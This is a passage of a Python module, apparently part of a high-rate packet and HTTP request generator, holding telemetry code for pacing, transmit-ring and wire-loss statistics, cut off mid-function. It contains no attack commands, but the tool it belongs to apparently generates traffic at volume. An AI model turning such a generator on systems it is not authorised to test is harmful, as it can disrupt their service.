import asyncio
import time
import logging
import socket
import traceback
import ssl
import random
import os
import errno
import numpy as np
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from .gpu_payload import H2RequestPlan

# Lazy import httpx for HTTP/2 support
try:
    import httpx
    HTTPX_AVAILABLE = True
except ImportError:
    HTTPX_AVAILABLE = False

# Lazy import for WebSockets
try:
    import websockets
    WEBSOCKETS_AVAILABLE = True
except ImportError:
    WEBSOCKETS_AVAILABLE = False

# Lazy import for aioquic (QUIC/HTTP3)
try:
    from aioquic.asyncio.client import connect
    from aioquic.quic.configuration import QuicConfiguration
    from aioquic.h3.connection import H3_ALPN, H3Connection
    from aioquic.quic.events import StreamDataReceived
    AIOQUIC_AVAILABLE = True
except ImportError:
    AIOQUIC_AVAILABLE = False

try:
    from . import h2_transport as _h2_transport
    HYPER_H2_AVAILABLE = bool(getattr(_h2_transport, "HYPER_H2_AVAILABLE", False))
except Exception:
    _h2_transport = None
    HYPER_H2_AVAILABLE = False

from . import utils
from . import packet as packet_utils
from . import cpu_packet_engine
from .scapy_support import ScapyUnavailableError, require_scapy

log_info = utils.log_info
log_error = utils.log_error
log_warning = utils.log_warning

_GATEWAY_CACHE = {}
_GATEWAY_CACHE_TTL_SEC = float(os.environ.get("SAMURAI_GATEWAY_CACHE_TTL_SEC", "60"))

def _scapy():
    return require_scapy()


def _stats(attempted: int = 0, sent: int = 0, errors: int = 0, bytes_sent_est: int = 0, **extra):
    out = {
        "attempted": int(attempted),
        "sent": int(sent),
        "errors": int(errors),
        "bytes_sent_est": int(bytes_sent_est),
        "buffer_copy_count": 0,
        "buffer_copy_bytes": 0,
        "eagain_retry_count": 0,
        "partial_send_retry_count": 0,
        "buffer_reuse_hits": 0,
        "actual_rps": 0.0,
        "rate_accuracy_pct": 0.0,
        "jitter_p99_ns": 0.0,
        "ipg_mean_ns": 0.0,
        "sleep_calls": 0,
        "busywait_cycles": 0,
        "so_txtime_active": 0,
        "txtime_errors": 0,
        "txring_flush_call_count": 0,
        "txring_flush_error_count": 0,
        "txring_flush_eagain_count": 0,
        "txring_flush_enobufs_count": 0,
        "txring_flush_ebusy_count": 0,
        "txring_flush_other_errno_count": 0,
        "txring_flush_last_errno": 0,
        "txring_flush_last_errno_name": "NONE",
        "txring_frame_wait_ns": 0,
        "txring_poll_count": 0,
        "flush_mode": "unknown",
        "txring_tp_packets": 0,
        "txring_tp_drops": 0,
        "txring_tp_freeze_q_cnt": 0,
        "txring_packet_version": 0,
        "txring_packet_version_name": "TPACKET_UNKNOWN",
        "host_tx_packets_delta": 0,
        "host_tx_dropped_delta": 0,
        "host_tx_errors_delta": 0,
        "softnet_dropped_delta": 0,
        "softnet_time_squeeze_delta": 0,
        "wire_counter_available": 0,
        "wire_counter_source": "none",
        "wire_counter_confidence": 0.0,
        "wire_counter_reason": "",
        "wire_tx_packets_delta": 0,
        "wire_tx_dropped_delta": 0,
        "wire_tx_errors_delta": 0,
        "wire_tx_bytes_delta": 0,
        "nicq_counter_available": 0,
        "nicq_counter_source": "none",
        "nicq_counter_confidence": 0.0,
        "nicq_counter_reason": "",
        "nicq_pressure_delta": 0,
        "nicq_drop_delta": 0,
        "nicq_fifo_delta": 0,
        "nicq_timeout_delta": 0,
        "nicq_restart_delta": 0,
        "nicq_busy_delta": 0,
        "nicq_pressure_status": "unknown",
        "wire_tx_accounted_packets": 0,
        "wire_tx_over_attempted_packets": 0,
        "wire_loss_measurement_mode": "unknown",
        "wire_loss_est_packets": 0,
        "wire_loss_est_pct": 0.0,
        "wire_loss_raw_packets": 0,
        "wire_loss_raw_uncapped_packets": 0,
        "wire_loss_raw_pct": 0.0,
        "wire_loss_raw_pct_of_attempted": 0.0,
        "wire_loss_raw_over_attempted_packets": 0,
        "wire_loss_raw_over_attempted_pct": 0.0,
        "wire_loss_raw_gt_attempted": 0,
        "wire_loss_estimation_capped": 0,
        "txring_drop_ratio_pct": 0.0,
        "txring_flush_error_ratio_pct": 0.0,
        "txring_flush_eagain_ratio_pct": 0.0,
        "txring_flush_enobufs_ratio_pct": 0.0,
        "txring_flush_ebusy_ratio_pct": 0.0,
        "txring_flush_other_errno_ratio_pct": 0.0,
        "gpu_template_h2d_copy_count": 0,
        "gpu_template_h2d_copy_bytes": 0,
        "gpu_rng_state_alloc_count": 0,
        "gpu_rng_state_reuse_count": 0,
    }
    for k, v in extra.items():
        if isinstance(v, bool):
            out[k] = int(v)
        elif isinstance(v, (int, float)):
            out[k] = float(v) if isinstance(v, float) else int(v)
        elif isinstance(v, str):
            out[k] = v
    return out


def _recompute_loss_metrics(out: dict) -> dict:
    d = dict(out or {})
    attempted = max(0, int(d.get("attempted", 0) or 0))
    tx_packets = max(0, int(d.get("txring_tp_packets", 0) or 0))
    tx_drops = max(0, int(d.get("txring_tp_drops", 0) or 0))
    wire_tx_packets = max(0, int(d.get("wire_tx_packets_delta", 0) or 0))
    wire_counter_available = int(
        bool(
            int(
                d.get(
                    "wire_counter_available",
                    1 if ("wire_tx_packets_delta" in d or "host_tx_packets_delta" in d) else 0,
                )
                or 0
            )
        )
    )
    wire_counter_confidence = max(0.0, min(1.0, float(d.get("wire_counter_confidence", 0.0) or 0.0)))
    wire_counter_source = str(d.get("wire_counter_source", "none") or "none")
    wire_counter_reason = str(d.get("wire_counter_reason", "") or "")
    nicq_counter_available = int(
        bool(
            int(
                d.get(
                    "nicq_counter_available",
                    1 if ("nicq_pressure_delta" in d or "nicq_drop_delta" in d) else 0,
                )
                or 0
            )
        )
    )
    nicq_counter_confidence = max(0.0, min(1.0, float(d.get("nicq_counter_confidence", 0.0) or 0.0)))
    nicq_counter_source = str(d.get("nicq_counter_source", "none") or "none")
    nicq_counter_reason = str(d.get("nicq_counter_reason", "") or "")
    nicq_drop_delta = max(0, int(d.get("nicq_drop_delta", 0) or 0))
    nicq_fifo_delta = max(0, int(d.get("nicq_fifo_delta", 0) or 0))
    nicq_timeout_delta = max(0, int(d.get("nicq_timeout_delta", 0) or 0))
    nicq_restart_delta = max(0, int(d.get("nicq_restart_delta", 0) or 0))
    nicq_busy_delta = max(0, int(d.get("nicq_busy_delta", 0) or 0))
    nicq_pressure_delta = max(0, int(d.get("nicq_pressure_delta", 0) or 0))
    nicq_pressure_delta = max(
        nicq_pressure_delta,
        nicq_drop_delta + nicq_fifo_delta + nicq_timeout_delta + nicq_restart_delta + nicq_busy_delta,
    )
    legacy_host_tx_packets = max(0, int(d.get("host_tx_packets_delta", 0) or 0))
    if (
        wire_counter_available
        and wire_tx_packets <= 0
        and wire_counter_source in ("", "none", "unknown", "legacy_host_tx_packets")
        and legacy_host_tx_packets > 0
    ):
        wire_tx_packets = legacy_host_tx_packets
        wire_counter_source = "legacy_host_tx_packets"
        wire_counter_confidence = max(wire_counter_confidence, 0.5)
        if not wire_counter_reason:
            wire_counter_reason = "wire_tx_packets_missing_using_host_tx_packets_delta"
    host_tx_dropped = max(0, int(d.get("host_tx_dropped_delta", 0) or 0))
    existing_est = max(0, int(d.get("wire_loss_est_packets", 0) or 0))
    existing_raw = max(
        0,
        int(d.get("wire_loss_raw_packets", 0) or 0),
        int(d.get("wire_loss_raw_uncapped_packets", 0) or 0),
    )
    flush_calls = max(0, int(d.get("txring_flush_call_count", 0) or 0))
    flush_errors = max(0, int(d.get("txring_flush_error_count", 0) or 0))
    flush_eagain = max(0, int(d.get("txring_flush_eagain_count", 0) or 0))
    flush_enobufs = max(0, int(d.get("txring_flush_enobufs_count", 0) or 0))
    flush_ebusy = max(0, int(d.get("txring_flush_ebusy_count", 0) or 0))
    flush_other_errno = max(0, int(d.get("txring_flush_other_errno_count", 0) or 0))

    tx_drops_bounded = min(tx_drops, tx_packets) if tx_packets > 0 else tx_drops
    wire_tx_accounted_packets = min(attempted, wire_tx_packets) if wire_counter_available else 0
    wire_tx_over_attempted_packets = max(0, wire_tx_packets - attempted) if wire_counter_available else 0
    if wire_counter_available:
        derived_raw_loss = max(0, attempted - wire_tx_accounted_packets)
        raw_loss_packets = max(existing_raw, derived_raw_loss)
        est_loss_packets = min(attempted, max(existing_est, raw_loss_packets))
        measurement_mode = "wire_tx_packets"
    else:
        raw_loss_packets = max(existing_raw, 0)
        est_loss_packets = min(attempted, max(existing_est, 0))
        measurement_mode = "unavailable"
        # Backward compatibility fallback for legacy test inputs with no wire counters.
        if host_tx_dropped > 0:
            raw_loss_packets = max(raw_loss_packets, host_tx_dropped)
            est_loss_packets = min(attempted, max(est_loss_packets, host_tx_dropped))
            measurement_mode = "host_tx_dropped_fallback"

    raw_over_attempted = max(0, raw_loss_packets - attempted)
    raw_over_attempted_pct = float((100.0 * raw_over_attempted) / max(1, attempted))

    d["wire_counter_available"] = int(wire_counter_available)
    d["wire_counter_source"] = str(wire_counter_source)
    d["wire_counter_confidence"] = float(wire_counter_confidence)
    d["wire_counter_reason"] = str(wire_counter_reason)
    d["nicq_counter_available"] = int(nicq_counter_available)
    d["nicq_counter_source"] = str(nicq_counter_source)
    d["nicq_counter_confidence"] = float(nicq_counter_confidence)
    d["nicq_counter_reason"] = str(nicq_counter_reason)
    d["nicq_pressure_delta"] = int(nicq_pressure_delta) if nicq_counter_available else 0
    d["nicq_drop_delta"] = int(nicq_drop_delta) if nicq_counter_available else 0
    d["nicq_fifo_delta"] = int(nicq_fifo_delta) if nicq_counter_available else 0
    d["nicq_timeout_delta"] = int(nicq_timeout_delta) if nicq_counter_available else 0
    d["nicq_restart_delta"] = int(nicq_restart_delta) if nicq_counter_available else 0
    d["nicq_busy_delta"] = int(nicq_busy_delta) if nicq_counter_available else 0
    d["nicq_pressure_status"] = (
        "warn" if int(d["nicq_pressure_delta"]) > 0 else "ok"
    ) if nicq_counter_available else "unknown"
    d["wire_tx_accounted_packets"] = int(wire_tx_accounted_packets)
    d["wire_tx_over_attempted_packets"] = int(wire_tx_over_attempted_packets)
    d["wire_loss_measurement_mode"] = str(measurement_mode)
    d["wire_loss_raw_packets"] = int(raw_loss_packets)
    d["wire_loss_raw_uncapped_packets"] = int(raw_loss_packets)
    d["wire_loss_raw_pct"] = float((100.0 * raw_loss_packets) / max(1, attempted))
    d["wire_loss_raw_pct_of_attempted"] = float(d["wire_loss_raw_pct"])
    d["wire_loss_raw_over_attempted_packets"] = int(raw_over_attempted)
    d["wire_loss_raw_over_attempted_pct"] = float(raw_over_attempted_pct)
    d["wire_loss_raw_gt_attempted"] = int(raw_over_attempted > 0)
    d["wire_loss_est_packets"] = int(est_loss_packets)
    d["wire_loss_est_pct"] = float((100.0 * est_loss_packets) / max(1, attempted))
    d["wire_loss_estimation_capped"] = int(raw_loss_packets > est_loss_packets)
    d["txring_drop_ratio_pct"] = float((100.0 * tx_drops_bounded) / max(1, tx_packets))
    d["txring_flush_error_ratio_pct"] = float((100.0 * flush_errors) / max(1, flush_calls))
    d["txring_flush_eagain_ratio_pct"] = float((100.0 * flush_eagain) / max(1, flush_calls))
    d["txring_flush_enobufs_ratio_pct"] = float((100.0 * flush_enobufs) / max(1, flush_calls))
    d["txring_flush_ebusy_ratio_pct"] = float((100.0 * flush_ebusy) / max(1, flush_calls))
    d["txring_flush_other_errno_ratio_pct"] = float((100.0 * flush_other_errno) / max(1, flush_calls))
    return d

def _update_live(val, inc):
    if val is not None:
        try:
            with val.get_lock():
                val.value += int(inc)
        except Exception:
            pass


def _env_flag(name: str, default: str = "1") -> bool:
    raw = str(os.environ.get(name, default) or default).strip().lower()
    return raw not in {"0", "false", "no", "off", "disabled"}


def _estimate_paced_packets(
    pacing_config,
    elapsed_s: float,
    *,
    progress_budget: int,
) -> int:
    if pacing_config is None or progress_budget <= 0:
        return 0

    mode = int(getattr(pacing_config, "pacing_mode", 0) or 0)
    est = 0.0

    if mode == 1:  # RPS
        rps = float(getattr(pacing_config, "target_rps", 0.0) or 0.0)
        if rps > 0.0:
            est = elapsed_s * rps
    elif mode == 2:  # IPG
        ipg_ns = int(getattr(pacing_config, "ipg_ns", 0) or 0)
        if ipg_ns > 0:
            est = elapsed_s * (1e9 / float(ipg_ns))
    elif mode == 3:  # BURST
        burst_size = max(1, int(getattr(pacing_config, "burst_size", 1) or 1))
        burst_gap_ns = max(0, int(getattr(pacing_config, "burst_gap_ns", 0) or 0))
        if burst_gap_ns <= 0:
            est = float(progress_budget)
        else:
            est = elapsed_s * (1e9 / float(burst_gap_ns)) * float(burst_size)

    out = int(est)
    if out < 0:
        return 0
    if out > progress_budget:
        return int(progress_budget)
    return out


class _PacedSendRuntimeError(RuntimeError):
    def __init__(self, cause: Exception, progress_emitted: int):
        super().__init__(str(cause))
        self.cause = cause
        self.progress_emitted = int(progress_emitted)


async def _run_paced_send_with_live_progress(
    send_callable,
    *,
    pacing_config,
    progress_budget: int,
    live_progress=None,
):
    loop = asyncio.get_running_loop()
    fut = loop.run_in_executor(None, send_callable)

    budget = max(0, int(progress_budget))
    if budget <= 0 or live_progress is None or not _env_flag("SAMURAI_PACING_PROGRESS_EST", "1"):
        return int(await fut or 0), 0

    try:
        refresh_ms = int(os.environ.get("SAMURAI_PACING_PROGRESS_REFRESH_MS", "200") or 200)
    except Exception:
        refresh_ms = 200
    refresh_s = max(0.05, float(refresh_ms) / 1000.0)

    start = time.monotonic()
    emitted = 0
    soft_cap = max(0, budget - 1)

    while not fut.done():
        await asyncio.sleep(refresh_s)
        target = _estimate_paced_packets(
            pacing_config,
            elapsed_s=max(0.0, time.monotonic() - start),
            progress_budget=budget,
        )
        if target > soft_cap:
            target = soft_cap
        delta = int(target) - int(emitted)
        if delta > 0:
            _update_live(live_progress, delta)
            emitted += delta

    try:
        sent = int(fut.result() or 0)
    except Exception as exc:
        raise _PacedSendRuntimeError(exc, emitted) from exc
    return sent, emitted


def _loss_telemetry_enabled() -> bool:
    mode = str(os.environ.get("SAMURAI_LOSS_TELEMETRY", "auto") or "auto").strip().lower()
    return mode not in {"0", "false", "off", "no", "disabled"}


def _resolve_loss_iface(preferred_iface=None):
    env_iface = str(os.environ.get("SAMURAI_LOSS_IFACE", "") or "").strip()
    if env_iface:
        return env_iface
    return preferred_iface


def _take_loss_snapshot(preferred_iface=None):
    if not _loss_telemetry_enabled():
        return {}
    try:
        from . import loss_telemetry

        return dict(loss_telemetry.snapshot(iface=_resolve_loss_iface(preferred_iface)) or {})
    except Exception:
        return {}


def _take_loss_delta(before: dict, preferred_iface=None) -> dict:
    if not isinstance(before, dict) or not before:
        return {}
    try:
        from . import loss_telemetry

        after = dict(loss_telemetry.snapshot(iface=_resolve_loss_iface(preferred_iface)) or {})
        return dict(loss_telemetry.delta(before, after) or {})
    except Exception:
        return {}


def _attach_loss_telemetry(stats_out: dict, before_snapshot: dict, preferred_iface=None) -> dict:
    out = dict(stats_out or {})
    delta = _take_loss_delta(before_snapshot, preferred_iface=preferred_iface)

    out["host_tx_packets_delta"] = int(delta.get("host_tx_packets_delta", 0) or 0)
    out["host_tx_dropped_delta"] = int(delta.get("host_tx_dropped_delta", 0) or 0)
    out["host_tx_errors_delta"] = int(delta.get("host_tx_errors_delta", 0) or 0)
    out["softnet_dropped_delta"] = int(delta.get("softnet_dropped_delta", 0) or 0)
    out["softnet_time_squeeze_delta"] = int(delta.get("softnet_time_squeeze_delta", 0) or 0)
    out["wire_counter_available"] = int(delta.get("wire_counter_available", 0) or 0)
    out["wire_counter_source"] = str(delta.get("wire_counter_source", "none") or "none")
    out["wire_counter_confidence"] = float(delta.get("wire_counter_confidence", 0.0) or 0.0)
    out["wire_counter_reason"] = str(delta.get("wire_counter_reason", "") or "")
    out["wire_tx_packets_delta"] = int(delta.get("wire_tx_packets_delta", 0) or 0)
    out["wire_tx_dropped_delta"] = int(delta.get("wire_tx_dropped_delta", 0) or 0)
    out["wire_tx_errors_delta"] = int(delta.get("wire_tx_errors_delta", 0) or 0)
    out["wire_tx_bytes_delta"] = int(delta.get("wire_tx_bytes_delta", 0) or 0)
    out["nicq_counter_available"] = int(delta.get("nicq_counter_available", 0) or 0)
    out["nicq_counter_source"] = str(delta.get("nicq_counter_source", "none") or "none")
    out["nicq_counter_confidence"] = float(delta.get("nicq_counter_confidence", 0.0) or 0.0)
    out["nicq_counter_reason"] = str(delta.get("nicq_counter_reason", "") or "")
    out["nicq_pressure_delta"] = int(delta.get("nicq_pressure_delta", 0) or 0)
    out["nicq_drop_delta"] = int(delta.get("nicq_drop_delta", 0) or 0)
    out["nicq_fifo_delta"] = int(delta.get("nicq_fifo_delta", 0) or 0)
    out["nicq_timeout_delta"] = int(delta.get("nicq_timeout_delta", 0) or 0)
    out["nicq_restart_delta"] = int(delta.get("nicq_restart_delta", 0) or 0)
    out["nicq_busy_delta"] = int(delta.get("nicq_busy_delta", 0) or 0)
    return _recompute_loss_metrics(out)


def _apply_pacing_stats(out: dict, stats: dict | None) -> dict:
    d = dict(out or {})
    st = dict(stats or {})

    d["actual_rps"] = float(st.get("actual_rps", 0.0) or 0.0)
    d["rate_accuracy_pct"] = float(st.get("rate_accuracy_pct", 0.0) or 0.0)
    d["jitter_p99_ns"] = float(st.get("jitter_p99_ns", 0.0) or 0.0)
    d["ipg_mean_ns"] = float(st.get("ipg_mean_ns", 0.0) or 0.0)
    d["sleep_calls"] = int(st.get("sleep_calls", 0) or 0)
    d["busywait_cycles"] = int(st.get("busywait_cycles", 0) or 0)
    d["so_txtime_active"] = int(bool(st.get("so_txtime_active", 0)))
    d["txtime_errors"] = int(st.get("txtime_errors", 0) or 0)

    d["txring_flush_call_count"] = int(st.get("txring_flush_call_count", 0) or 0)
    d["txring_flush_error_count"] = int(st.get("txring_flush_error_count", 0) or 0)
    d["txring_flush_eagain_count"] = int(st.get("txring_flush_eagain_count", 0) or 0)
    d["txring_flush_enobufs_count"] = int(st.get("txring_flush_enobufs_count", 0) or 0)
    d["txring_flush_ebusy_count"] = int(st.get("txring_flush_ebusy_count", 0) or 0)
    d["txring_flush_other_errno_count"] = int(st.get("txring_flush_other_errno_count", 0) or 0)
    d["txring_flush_last_errno"] = int(st.get("txring_flush_last_errno", 0) or 0)
    d["txring_flush_last_errno_name"] = str(
        st.get("txring_flush_last_errno_name", "NONE") or "NONE"
    )
    d["txring_frame_wait_ns"] = int(st.get("txring_frame_wait_ns", 0) or 0)
    d["txring_poll_count"] = int(st.get("txring_poll_count", 0) or 0)
    d["txring_tp_packets"] = int(st.get("txring_tp_packets", 0) or 0)
    d["txring_tp_drops"] = int(st.get("txring_tp_drops", 0) or 0)
    d["txring_tp_freeze_q_cnt"] = int(st.get("txring_tp_freeze_q_cnt", 0) or 0)
    d["txring_packet_version"] = int(st.get("txring_packet_version", 0) or 0)
    d["txring_packet_version_name"] = str(
        st.get("txring_packet_version_name", "TPACKET_UNKNOWN") or "TPACKET_UNKNOWN"
    )
    return d


def _normalize_packets_buffer(
    packets_buffer,
    required_bytes: int,
    pool_key: str,
    *,
    return_meta: bool = False,
):
    """
    Normalize packet buffer for TX paths.
    - If a GPU array is provided, copy once into shared pinned host pool.
    - If a NumPy array is non-contiguous, compact it (prefer pinned pool).
    """
    meta = {"buffer_copy_count": 0, "buffer_copy_bytes": 0}

    def _ret(buf):
        if return_meta:
            return buf, meta
        return buf

    if required_bytes <= 0:
        return _ret(packets_buffer)

    # CUDA array interface (CuPy / Numba device arrays, etc.)
    if hasattr(packets_buffer, "__cuda_array_interface__"):
        try:
            from . import gpu_packet
            out = gpu_packet.copy_gpu_to_host_pinned(packets_buffer, key=pool_key, blocking=True)
            meta["buffer_copy_count"] = 1
            meta["buffer_copy_bytes"] = int(required_bytes)
            return _ret(out)
        except Exception as e:
            log_error(f"GPU->host normalize failed, using fallback copy: {e}")
            try:
                # Fallback for CuPy-like arrays
                out = packets_buffer.get()
                meta["buffer_copy_count"] = 1
                meta["buffer_copy_bytes"] = int(required_bytes)
                return _ret(out)
            except Exception:
                pass

    # Normalize memoryview into byte-addressable shape if needed
    if isinstance(packets_buffer, memoryview):
        if packets_buffer.itemsize != 1:
            packets_buffer = packets_buffer.cast("B")
        return _ret(packets_buffer)

    if isinstance(packets_buffer, np.ndarray):
        flat = np.ravel(packets_buffer)
        if flat.dtype != np.uint8:
            if flat.dtype.itemsize == 1:
                flat = flat.view(np.uint8)
            else:
                flat = flat.astype(np.uint8, copy=False)

        if flat.size < required_bytes:
            raise ValueError(
                f"Packet buffer too small: {flat.size} < required {required_bytes} bytes"
            )

        flat = flat[:required_bytes]
        if flat.flags.c_contiguous:
            return _ret(flat)

        try:
            from . import gpu_packet
            out = gpu_packet.get_pinned_host_pool().acquire(required_bytes, dtype=np.uint8, key=pool_key)
            out[:required_bytes] = flat
            meta["buffer_copy_count"] = 1
            meta["buffer_copy_bytes"] = int(required_bytes)
            return _ret(out[:required_bytes])
        except Exception:
            out = np.ascontiguousarray(flat)
            meta["buffer_copy_count"] = 1
            meta["buffer_copy_bytes"] = int(required_bytes)
            return _ret(out)

    return _ret(packets_buffer)


def _merge_stats(*items):
    acc = _stats(
        buffer_copy_count=0,
        buffer_copy_bytes=0,
        eagain_retry_count=0,
        partial_send_retry_count=0,
        buffer_reuse_hits=0,
        permission_error_count=0,
        fallback_count=0,
    )
    for it in items:
        if not isinstance(it, dict):
            continue
        acc["attempted"] += int(it.get("attempted", 0) or 0)
        acc["sent"] += int(it.get("sent", 0) or 0)
        acc["errors"] += int(it.get("errors", 0) or 0)
        acc["bytes_sent_est"] += int(it.get("bytes_sent_est", 0) or 0)
        acc["buffer_copy_count"] += int(it.get("buffer_copy_count", 0) or 0)
        acc["buffer_copy_bytes"] += int(it.get("buffer_copy_bytes", 0) or 0)
        acc["eagain_retry_count"] += int(it.get("eagain_retry_count", 0) or 0)
        acc["partial_send_retry_count"] += int(it.get("partial_send_retry_count", 0) or 0)
        acc["buffer_reuse_hits"] += int(it.get("buffer_reuse_hits", 0) or 0)
        item_actual_rps = float(it.get("actual_rps", 0.0) or 0.0)
        if item_actual_rps > 0.0 or float(acc.get("actual_rps", 0.0) or 0.0) == 0.0:
            acc["actual_rps"] = item_actual_rps
        item_rate_accuracy = float(it.get("rate_accuracy_pct", 0.0) or 0.0)
        if item_rate_accuracy > 0.0 or float(acc.get("rate_accuracy_pct", 0.0) or 0.0) == 0.0:
            acc["rate_accuracy_pct"] = item_rate_accuracy
        item_jitter_p99 = float(it.get("jitter_p99_ns", 0.0) or 0.0)
        if item_jitter_p99 > 0.0 or float(acc.get("jitter_p99_ns", 0.0) or 0.0) == 0.0:
            acc["jitter_p99_ns"] = item_jitter_p99
        item_ipg_mean = float(it.get("ipg_mean_ns", 0.0) or 0.0)
        if item_ipg_mean > 0.0 or float(acc.get("ipg_mean_ns", 0.0) or 0.0) == 0.0:
            acc["ipg_mean_ns"] = item_ipg_mean
        acc["sleep_calls"] += int(it.get("sleep_calls", 0) or 0)
        acc["busywait_cycles"] += int(it.get("busywait_cycles", 0) or 0)
        acc["so_txtime_active"] = max(
            int(acc.get("so_txtime_active", 0) or 0),
            int(bool(it.get("so_txtime_active", 0))),
        )
        acc["txtime_errors"] += int(it.get("txtime_errors", 0) or 0)
        acc["permission_error_count"] += int(it.get("permission_error_count", 0) or 0)
        acc["fallback_count"] += int(it.get("fallback_count", 0) or 0)
        acc["txring_flush_call_count"] += int(it.get("txring_flush_call_count", 0) or 0)
        acc["txring_flush_error_count"] += int(it.get("txring_flush_error_count", 0) or 0)
        acc["txring_flush_eagain_count"] += int(it.get("txring_flush_eagain_count", 0) or 0)
        acc["txring_flush_enobufs_count"] += int(it.get("txring_flush_enobufs_count", 0) or 0)
        acc["txring_flush_ebusy_count"] += int(it.get("txring_flush_ebusy_count", 0) or 0)
        acc["txring_flush_other_errno_count"] += int(it.get("txring_flush_other_errno_count", 0) or 0)
        _item_last_errno = int(it.get("txring_flush_last_errno", 0) or 0)
        _item_last_errno_name = str(it.get("txring_flush_last_errno_name", "") or "").strip()
        if _item_last_errno or _item_last_errno_name:
            acc["txring_flush_last_errno"] = _item_last_errno
            acc["txring_flush_last_errno_name"] = _item_last_errno_name or "OTHER"
        acc["txring_frame_wait_ns"] += int(it.get("txring_frame_wait_ns", 0) or 0)
        acc["txring_poll_count"] += int(it.get("txring_poll_count", 0) or 0)
        item_flush_mode = str(it.get("flush_mode", "") or "").strip()
        if item_flush_mode:
            curr_flush_mode = str(acc.get("flush_mode", "") or "").strip()
            if not curr_flush_mode or curr_flush_mode == "unknown":
                acc["flush_mode"] = item_flush_mode
            elif curr_flush_mode != item_flush_mode and curr_flush_mode != "mixed":
                acc["flush_mode"] = "mixed"
        acc["txring_tp_packets"] += int(it.get("txring_tp_packets", 0) or 0)
        acc["txring_tp_drops"] += int(it.get("txring_tp_drops", 0) or 0)
        acc["txring_tp_freeze_q_cnt"] += int(it.get("txring_tp_freeze_q_cnt", 0) or 0)
        item_txring_ver = int(it.get("txring_packet_version", 0) or 0)
        item_txring_ver_name = str(it.get("txring_packet_version_name", "") or "").strip()
        if item_txring_ver > 0:
            current_ver = int(acc.get("txring_packet_version", 0) or 0)
            current_ver_name = str(acc.get("txring_packet_version_name", "") or "").strip()
            if current_ver <= 0:
                acc["txring_packet_version"] = item_txring_ver
                acc["txring_packet_version_name"] = item_txring_ver_name or "TPACKET_UNKNOWN"
            elif current_ver != item_txring_ver:
                acc["txring_packet_version"] = 0
                acc["txring_packet_version_name"] = "MIXED"
            elif not current_ver_name:
                acc["txring_packet_version_name"] = item_txring_ver_name or "TPACKET_UNKNOWN"
        acc["host_tx_packets_delta"] += int(it.get("host_tx_packets_delta", 0) or 0)
        acc["host_tx_dropped_delta"] += int(it.get("host_tx_dropped_delta", 0) or 0)
        acc["host_tx_errors_delta"] += int(it.get("host_tx_errors_delta", 0) or 0)
        acc["softnet_dropped_delta"] += int(it.get("softnet_dropped_delta", 0) or 0)
        acc["softnet_time_squeeze_delta"] += int(it.get("softnet_time_squeeze_delta", 0) or 0)
        item_wire_avail = int(
            it.get(
                "wire_counter_available",
                1 if ("wire_tx_packets_delta" in it or "host_tx_packets_delta" in it) else 0,
            )
            or 0
        )
        acc["wire_counter_available"] = max(int(acc.get("wire_counter_available", 0) or 0), item_wire_avail)
        item_wire_source = str(it.get("wire_counter_source", "") or "").strip()
        if item_wire_source:
            curr_wire_source = str(acc.get("wire_counter_source", "") or "").strip()
            if not curr_wire_source or curr_wire_source in ("none", "unknown"):
                acc["wire_counter_source"] = item_wire_source
            elif curr_wire_source != item_wire_source and curr_wire_source != "mixed":
                acc["wire_counter_source"] = "mixed"
        item_wire_reason = str(it.get("wire_counter_reason", "") or "").strip()
        if item_wire_reason:
            curr_wire_reason = str(acc.get("wire_counter_reason", "") or "").strip()
            if not curr_wire_reason:
                acc["wire_counter_reason"] = item_wire_reason
            elif item_wire_reason not in curr_wire_reason:
                acc["wire_counter_reason"] = f"{curr_wire_reason};{item_wire_reason}"
        acc["wire_counter_confidence"] = max(
            float(acc.get("wire_counter_confidence", 0.0) or 0.0),
            float(it.get("wire_counter_confidence", 0.0) or 0.0),
        )
        acc["wire_tx_packets_delta"] += int(it.get("wire_tx_packets_delta", 0) or 0)
        acc["wire_tx_dropped_delta"] += int(it.get("wire_tx_dropped_delta", 0) or 0)
        acc["wire_tx_errors_delta"] += int(it.get("wire_tx_errors_delta", 0) or 0)
        acc["wire_tx_bytes_delta"] += int(it.get("wire_tx_bytes_delta", 0) or 0)
        item_nicq_avail = int(
            it.get(
                "nicq_counter_available",
                1 if ("nicq_pressure_delta" in it or "nicq_drop_delta" in it) else 0,
            )
            or 0
        )
        acc["nicq_counter_available"] = max(int(acc.get("nicq_counter_available", 0) or 0), item_nicq_avail)
        item_nicq_source = str(it.get("nicq_counter_source", "") or "").strip()
        if item_nicq_source:
            curr_nicq_source = str(acc.get("nicq_counter_source", "") or "").strip()
            if not curr_nicq_source or curr_nicq_source in ("none", "unknown"):
                acc["nicq_counter_source"] = item_nicq_source
            elif curr_nicq_source != item_nicq_source and curr_nicq_source != "mixed":
                acc["nicq_counter_source"] = "mixed"
        item_nicq_reason = str(it.get("nicq_counter_reason", "") or "").strip()
        if item_nicq_reason:
            curr_nicq_reason = str(acc.get("nicq_counter_reason", "") or "").strip()
            if not curr_nicq_reason:
                acc["nicq_counter_reason"] = item_nicq_reason
            elif item_nicq_reason not in curr_nicq_reason:
                acc["nicq_counter_reason"] = f"{curr_nicq_reason};{item_nicq_reason}"
        acc["nicq_counter_confidence"] = max(
            float(acc.get("nicq_counter_confidence", 0.0) or 0.0),
            float(it.get("nicq_counter_confidence", 0.0) or 0.0),
        )
        acc["nicq_pressure_delta"] += int(it.get("nicq_pressure_delta", 0) or 0)
        acc["nicq_drop_delta"] += int(it.get("nicq_drop_delta", 0) or 0)
        acc["nicq_fifo_delta"] += int(it.get("nicq_fifo_delta", 0) or 0)
        acc["nicq_timeout_delta"] += int(it.get("nicq_timeout_delta", 0) or 0)
        acc["nicq_restart_delta"] += int(it.get("nicq_restart_delta", 0) or 0)
        acc["nicq_busy_delta"] += int(it.get("nicq_busy_delta", 0) or 0)
        acc["wire_loss_est_packets"] += int(it.get("wire_loss_est_packets", 0) or 0)
        _raw_uncapped = int(it.get("wire_loss_raw_uncapped_packets", it.get("wire_loss_raw_packets", 0)) or 0)
        acc["wire_loss_raw_packets"] += int(it.get("wire_loss_raw_packets", _raw_uncapped) or 0)
        acc["wire_loss_raw_uncapped_packets"] += _raw_uncapped
        acc["gpu_template_h2d_copy_count"] += int(it.get("gpu_template_h2d_copy_count", 0) or 0)
        acc["gpu_template_h2d_copy_bytes"] += int(it.get("gpu_template_h2d_copy_bytes", 0) or 0)
        acc["gpu_rng_state_alloc_count"] += int(it.get("gpu_rng_state_alloc_count", 0) or 0)
        acc["gpu_rng_state_reuse_count"] += int(it.get("gpu_rng_state_reuse_count", 0) or 0)
        if "sender_path" in it:
